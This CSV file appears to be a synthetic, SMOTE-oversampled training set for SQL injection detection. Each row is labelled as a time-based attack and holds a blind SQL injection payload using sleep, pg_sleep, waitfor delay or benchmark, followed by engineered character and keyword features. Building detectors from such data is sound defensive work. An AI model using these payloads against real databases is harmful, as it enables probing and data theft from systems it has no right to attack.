id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000227,attack,time,1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000109,0.6416517922681967,91.65924590925177,21.65924590925177,2.8545125730698024,28.65924590925177,2.0,49.0,12.0,0.312599845478301,0.021822227127672983,0.534644564627988,0.1309333627660379,0.0,0.0,0.0,0.0,1.0,0.0,0.0,10.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.670377045374115,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.670377045374115
SMOTE_000228,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,0.6854093677448173,76.48680014064689,22.811333567744825,3.1979846683009243,19.162266713548966,10.0,37.0,10.32453342709793,0.25051350225806635,0.13076815432936892,0.48384217101866506,0.13487617239389968,0.16226671354896438,0.0,2.0,0.0,0.0,1.0,0.0,6.0,0.16226671354896455,1.0,0.0,3.0,0.16226671354896471,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.1622667135489646,0.8377332864510354,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000229,attack,time,"select pg_sleep  (  5  )   and    (    (   ""byhx"" like ""byhx",nearest_attack_euclidean,R000117,1.9198060163480093,58.908098497284556,20.544131329712748,3.3715861672317065,25.81619699456912,1.0,24.091901502715437,8.0,0.4372938777047308,0.016985936111905117,0.40983269728812327,0.1358874888952408,0.0,3.0,0.0,0.0,0.0,0.36396716757181335,0.0,4.0,0.0,0.6360328324281866,0.0,0.36396716757181324,0.0,1.0,0.0,0.0,0.0,0.3639671675718133,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3639671675718134,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3639671675718135
SMOTE_000230,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000034,0.24714694703696533,56.10965819855841,23.0,3.7759911180834154,23.177545311769343,4.0,17.798953902962054,11.133158983827009,0.414600648541016,0.07171849254676509,0.31479051711077727,0.1988903418014416,6.0,0.0,0.0,0.0,0.0,0.9556136720576638,0.0,2.177545311769345,0.0,0.0,0.0,0.9556136720576638,1.0,0.0,0.0,0.0,0.0,0.9556136720576638,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000231,attack,time,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""eran""  =  ""eran",nearest_attack_euclidean,R000022,0.35136688083421697,77.09706437590212,16.19412875180425,2.568864298503874,18.388257503608507,2.0,43.80587124819575,12.902935624097875,0.238452991843426,0.025941703504528096,0.5682286469482816,0.16737665770376434,0.0,4.0,0.0,0.0,0.0,0.9029356240978736,0.0,8.0,0.0,0.0,0.0,0.9029356240978736,0.0,1.0,0.0,0.0,0.0,0.9029356240978735,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000232,attack,time,"1"" where 1683  =  1683 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000092,0.4672105615984882,98.81758353719633,24.635167074392655,3.3209504359887623,32.0,10.0,45.0,11.817583537196327,0.32383398544730135,0.10119812045228166,0.4553915420352675,0.11957635206514951,0.0,0.8175835371963276,0.0,0.0,1.0,1.0,0.0,8.0,0.0,0.0,0.0,2.0,0.0,0.8175835371963278,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000233,attack,time,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  ",nearest_attack_euclidean,R000122,0.719690269675028,79.59271752561894,19.73454707906351,2.9631755873833296,27.0,2.0,40.061811683745965,10.53090584187298,0.33959044975706476,0.02515484813015295,0.5031601538206725,0.13209454829210973,0.0,1.0,0.0,0.0,1.0,0.0,0.0,8.26545292093649,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.2654529209364906,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000234,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000132,1.3757662821549705,63.61780389090576,23.84816990908813,3.813255168988654,23.0,9.926705836358636,21.230366018182373,9.460732036364748,0.362135726338766,0.1537997999145873,0.3345501719616254,0.14951430178502131,2.691098054547121,0.0,1.5392679636352526,0.0,0.0,1.0,0.0,2.230366018182374,0.0,0.0,0.0,2.5392679636352526,1.0,0.0,0.7696339818176263,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7696339818176263,0.0,0.23036601818237373,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000235,attack,time,"1%""   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000060,2.802627330032311,67.04272009760511,19.014240032535035,2.759787131181068,11.478639951197444,6.056960130140149,37.014240032535035,12.49287998373248,0.1725619633053058,0.08784821610128554,0.5525387139661737,0.1870511066272349,0.0,2.478639951197444,0.0,0.0,0.0,1.0,0.0,6.5071200162675185,1.4928799837324813,0.0,0.5071200162675185,1.0,0.0,1.0,0.0,0.5071200162675187,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4928799837324814,0.5071200162675186,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000236,attack,time,"1'+  (  select 'plcm' where 2141  =  2141 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000064,1.633766327145683,94.07821243304281,27.24692745982568,3.6420892433555543,25.58435751339144,18.0,36.662569946434246,13.831284973217121,0.2722688668728036,0.1914603514349204,0.3894239130340041,0.14684686865827193,3.4156424866085606,0.0,0.0,0.0,0.0,2.0,0.0,5.415642486608561,0.0,0.0,1.0,3.4156424866085606,1.0,0.0,0.0,0.5843575133914394,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.5843575133914394,0.4156424866085605,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000237,attack,time,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000029,0.8957176579008632,92.07972172924455,22.079721729244547,2.8735153045681985,29.079721729244547,2.0,49.0,12.0,0.31572993843110086,0.021722859097425384,0.5322100478869215,0.13033715458455222,0.0,0.0,0.0,0.0,1.0,0.0,0.0,10.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.4601391353777258,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.460139135377726
SMOTE_000238,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000048,0.8693396632583573,96.03609654488645,27.730554231353313,3.7429207789223167,26.0,21.730554231353313,35.844433850826505,12.461108462706626,0.27147170452628017,0.22664494317223097,0.3722712675075917,0.1296120847938972,4.0,0.0,0.0,0.0,0.0,2.0,0.0,5.461108462706625,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.7305542313533129,0.2694457686466871,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000239,attack,time,"1   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000128,0.7134615632337468,78.53089077086547,26.0,3.511930558618247,15.790127252980781,21.20987274701922,32.740763517884695,8.790127252980781,0.20114998765489983,0.2706577249269456,0.41630321835982004,0.11188906905833447,0.2098727470192181,0.0,0.0,0.0,0.0,1.0,0.0,5.790127252980782,0.0,0.0,1.0,1.0,0.2098727470192181,0.0,0.0,0.7901272529807819,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000240,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000095,1.382278903074017,86.98182458758944,27.009087706205282,3.6290280007537565,24.50454385310264,18.0,34.981824587589436,9.495456146897359,0.282001402884863,0.207049194636271,0.4018578821618838,0.10909152031698223,0.0,0.0,2.0,0.0,0.0,2.0,0.0,4.495456146897359,0.0,1.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.5045438531026407,0.4954561468973593,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000241,attack,time,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""hdis"" like ""hdis",nearest_attack_euclidean,R000085,1.438821204743561,73.55430157052083,17.444287696315104,2.799799101755029,22.0,1.7221438481575522,38.665726177890626,11.166431544472657,0.3022757165939913,0.022998059763285228,0.5232932125545066,0.15143301108821697,0.0,3.722143848157552,0.0,0.0,0.0,0.27785615184244794,0.0,7.1664315444726565,0.0,0.0,0.0,0.27785615184244805,0.0,1.0,0.0,0.0,0.0,0.27785615184244805,1.0,0.0,0.0,0.0,0.0,0.27785615184244794,0.0,0.0,0.0,1.0,0.7221438481575521,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000242,attack,time,1'   )    )     )   or sleep  (  5  )   and    (    (     (  'wuwv'  =  'wuwv,nearest_attack_euclidean,R000142,0.2215875036078518,76.53401539432046,19.133138458765583,2.677299212324832,18.199707688148372,2.0,43.46744616493767,12.866861541234417,0.2381753645435355,0.02614693306333192,0.5676246154638405,0.16805308692929205,4.0,0.0,0.0,0.0,0.0,1.0,0.0,7.866861541234418,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.933430770617209,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.933430770617209
SMOTE_000243,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000129,0.13134342622155212,64.73913085257013,24.89565234102805,3.4881291046711977,19.10434765897195,10.0,27.686957023084148,7.947826170514024,0.2953177209318832,0.15451504909597405,0.4274247545201298,0.12274247545201299,1.0,0.0,2.0,0.0,0.0,1.0,0.0,3.9478261705140247,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.9478261705140246,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9478261705140247
SMOTE_000244,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,nearest_attack_euclidean,R000094,0.004136362257767696,85.0114505486523,26.003435164595693,3.6891484205645293,31.003435164595693,10.0,33.006870329191386,11.001145054865232,0.3646980832176362,0.11763287857752036,0.38826081856046335,0.1294082196443801,4.0,0.0,0.0,0.0,0.0,1.9988549451347688,0.0,4.002290109730462,0.0,1.0,0.0,1.998854945134769,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.9988549451347688,0.0011450548652310877,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000245,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R000037,0.0529147208647765,64.97927209604183,22.0,3.350157630046871,18.97927209604182,10.0,28.0,8.0,0.2920784895235394,0.153895980538361,0.4309087455074109,0.12311678443068881,0.0,1.0,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.9792720960418199,0.02072790395818014,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000246,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000048,0.002580629463403708,99.0,28.0,3.739785052408689,26.0,22.0,38.0,13.0,0.26262626262626265,0.2222222222222222,0.3838383838383838,0.13131313131313133,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000247,attack,time,"1  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000076,0.1192510970856896,70.90234456785662,24.96744818928554,3.554286306632162,15.065103621428918,20.934896378571082,27.869792757142164,7.032551810714459,0.21252841520372906,0.29524200641125886,0.39301773775002236,0.0992118406349897,0.0,0.03255181071445923,0.0,0.0,0.0,1.0,0.0,4.967448189285541,0.0,0.0,1.0,1.0,0.0,0.0325518107144592,0.0,0.03255181071445923,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000248,attack,time,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',nearest_attack_euclidean,R000075,2.700058621843183,72.13428313449863,24.555951306041095,3.453728036343608,17.600712350873973,10.0,31.533570783624658,13.0,0.24046257467156176,0.13959929461053103,0.43845904772421684,0.1814790829936903,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,2.0,0.5111902612082192,0.48880973879178075,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.5111902612082192,0.0,0.0,0.5111902612082192,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4888097387917809,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.511190261208219
SMOTE_000249,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000013,1.5307049394518282,66.0,24.937143514360976,3.5909963772570435,19.468571757180488,10.0,27.0,9.531428242819512,0.2949783599572801,0.15151515151515152,0.4090909090909091,0.14441557943665928,1.0,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.5314282428195118,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.46857175718048816,0.5314282428195118,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000250,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000013,0.8373154118050677,66.73701599652237,24.49134399768158,3.581077495814045,19.98268799536316,10.0,27.24567199884079,9.50865600231842,0.2990456969170056,0.14989675890091705,0.4082817127837919,0.14277583139828545,0.7543280011592097,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.7543280011592097,1.0,0.0,3.0,0.7543280011592097,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000251,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000035,0.4687033992084155,82.87460296566995,24.87460296566995,3.2290455944507026,30.0,2.0,39.0,11.874602965669949,0.361998517635895,0.02413323450905966,0.47059807292666356,0.14327017492838176,0.125397034330051,0.8746029656699489,0.0,0.0,1.0,0.0,0.0,8.0,0.8746029656699488,0.0,0.0,1.0,0.12539703433005112,0.874602965669949,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000252,attack,time,"1"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000021,2.002585154435831,77.92762771259027,25.98552554251805,3.7731905518637854,19.481906928147566,22.971051085036105,26.978288313777078,8.496381385629514,0.25,0.29301580000722593,0.3469686731675593,0.1100155268252147,0.0,1.0,0.0,0.0,0.0,1.4963813856295132,0.0,4.0,0.0,0.0,1.0,1.4963813856295132,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.49638138562951306,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.496381385629513
SMOTE_000253,attack,time,"1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '%'  =  '",nearest_attack_euclidean,R000074,0.6035487108384944,67.78599912416479,19.26199970805493,3.235867097475996,15.047998832219713,10.0,30.0,12.738000291945072,0.22106152811703408,0.14764669980747333,0.4429400994224201,0.1883516726530725,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,1.7380002919450719,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000254,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,0.5864368236485221,75.10909614882607,22.356361540469575,3.209306279590677,19.0,10.0,35.93091537859128,10.178180770234787,0.2531369853914575,0.13322999231129343,0.47789344167278963,0.13573958062445943,0.17818077023478662,0.0,2.0,0.0,0.0,1.0,0.0,5.821819229765214,0.17818077023478673,1.0,0.0,3.0,0.17818077023478673,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000255,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000100,0.17199684285867478,77.86952813525342,27.043490621582194,3.73413094178302,22.69556564892465,15.260943729493157,28.956509378417806,10.956509378417808,0.29132563649663146,0.19612148527720769,0.3718617804434598,0.14069109778270109,0.0,2.9130187568356147,0.0,0.0,0.0,1.0,0.0,5.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.043490621582192746,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.9565093784178073,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9565093784178074
SMOTE_000256,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000041,0.6205444765627961,67.07658798416333,24.461270387330664,3.5751643790322833,21.461270387330664,10.0,27.615317596832668,8.0,0.3193084540511909,0.14928308880397798,0.4119819861016487,0.11942647104318238,0.0,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000257,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000014,1.3306371003928985,61.155607109853804,19.187316317101086,3.070759335682435,20.749265268404343,1.0,29.0,10.406341841449457,0.3366826772317398,0.01640471296330763,0.475736675935921,0.1711759338690316,3.0,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.4063418414494572,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000258,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000095,0.8422134499028415,90.37517732261736,28.75035464523472,3.645323796492574,25.0,18.0,37.0,10.37517732261736,0.27663254785525837,0.19917543445578603,0.40941617082578236,0.11477584686317321,0.3751773226173587,0.0,2.0,0.0,0.0,2.0,0.0,5.0,0.0,1.0,0.0,4.0,0.3751773226173589,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
